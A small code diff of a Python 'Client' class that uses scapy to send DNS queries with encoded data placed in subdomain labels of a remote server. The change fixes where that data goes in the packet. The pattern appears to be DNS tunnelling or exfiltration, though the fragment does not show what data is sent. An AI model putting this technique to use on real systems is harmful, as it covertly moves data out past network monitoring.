@@ -38,8 +38,7 @@ class Client:
 
             # Craft the packet with scapy
             try:
-                send(IP(dst=encoded_data + "." + self.remote_server)/UDP()/DNS(
-                    id=15, opcode=0,
+                send(IP()/UDP()/DNS(
                     qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")],
                     verbose=False))
             except socket.gaierror:
